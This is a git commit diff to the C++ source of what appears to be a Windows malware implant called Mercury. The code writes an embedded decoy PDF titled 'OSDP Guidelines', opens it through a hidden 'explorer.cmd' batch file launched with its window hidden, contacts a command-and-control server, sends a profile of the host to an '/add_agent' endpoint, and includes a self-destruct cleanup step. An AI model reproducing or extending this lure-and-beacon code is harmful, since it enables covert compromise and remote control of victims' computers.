02bb1c86c8b73d868053d9b1adc7712f81ff73df
0xConstant <noroh4xy@protonmail.com>
2023-10-06 02:37:07 -0700

    changing approach; .uid file is now being moved to temp and access from temp

--- Mercury/main.cpp
+++ Mercury/main.cpp
@@ -5,6 +5,7 @@
 #include "Communication/c2_resolve.hpp"
 #include "Communication/addagent.hpp"
 #include "Core/osdp.h"
+#include "Core/helpers.hpp"
 
 
 
@@ -21,83 +22,22 @@ void CleanupAndDestroy() {
 }
 
 
-std::string TmpPath() {
-    char buffer[MAX_PATH];
-    DWORD length = GetTempPathA(MAX_PATH, buffer);
-    if (length == 0 || length >= MAX_PATH) {
-        //std::cerr << "Failed to get temp path\n";
-        return "";
-    }
-    return std::string(buffer);
-}
-
-
-std::string CreateBat(const std::string& pdfPath) {
-    std::string tempDirectory = TmpPath();
-    const std::string batFileName = tempDirectory + "explorer.cmd";
-
-    // If the file exists, first remove the hidden attribute and then delete it
-    if (GetFileAttributesA(batFileName.c_str()) != INVALID_FILE_ATTRIBUTES) {
-        SetFileAttributesA(batFileName.c_str(), FILE_ATTRIBUTE_NORMAL);
-        DeleteFileA(batFileName.c_str());
-    }
-
-    std::ofstream batchFile(batFileName);
-    if (!batchFile.is_open()) {
-        //std::cerr << "Failed to create batch file\n";
-        return "";
-    }
-
-    batchFile << "@echo off\n";
-    batchFile << "start \"\" \"" << pdfPath << "\"\n";
-    batchFile.close();
-
-    SetFileAttributesA(batFileName.c_str(), FILE_ATTRIBUTE_HIDDEN);
-
-    return batFileName;
-}
-
-
-
-
-std::string GetCWD() {
-    char buffer[MAX_PATH];
-    if (GetCurrentDirectoryA(MAX_PATH, buffer) != 0) { // Notice the 'A' at the end of GetCurrentDirectoryA
-        return std::string(buffer) + "\\";
-    }
-    return "";
-}
-
-
-void ExecBat(const std::string& batchPath) {
-    ShellExecuteA(
-        NULL,           // Parent window
-        "open",         // Operation to perform
-        batchPath.c_str(), // Full path to the batch file
-        NULL,           // Parameters
-        NULL,           // Default directory
-        SW_HIDE         // Window show command
-    );
-}
-
-
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    std::string pdfPath = GetCWD() + "OSDP Guidelines.pdf";
-    std::ofstream output(pdfPath, std::ios::binary);
-    output.write(reinterpret_cast<char*>(OSDP_Guidelines_pdf), OSDP_Guidelines_pdf_len);
-    output.close();
-
-    std::string BatPath = CreateBat(pdfPath);
-    Sleep(1);
-    ExecBat(BatPath);
-
-    /*
+int main() {
     // Mode 1: run once and then > cleanup > self destruct
-    if (ONETIMERUN) { 
+    if (ONETIMERUN) {  
         bool ReachIntranet = googleConn(); 
         if (ReachIntranet) { 
             std::wstring C2 = C2Conn(URLS); 
             if (!C2.empty()) {
+                std::string pdfPath = GetCWD() + "OSDP Guidelines.pdf"; 
+                std::ofstream output(pdfPath, std::ios::binary); 
+                output.write(reinterpret_cast<char*>(OSDP_Guidelines_pdf), OSDP_Guidelines_pdf_len); 
+                output.close(); 
+
+                std::string BatPath = CreateBat(pdfPath); 
+                Sleep(1); 
+                ExecBat(BatPath);
+
                 std::wstring PC2 = C2 + L"/add_agent";
                 nlohmann::json JsonProfile = Profiler(); 
                 std::string response = SendProfile(PC2, JsonProfile);
@@ -113,7 +53,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     // This code might never see the light of the day but I gonna keep here anyways...
     CleanupAndDestroy(); 
-    */
+    
 
     return 0;
 }
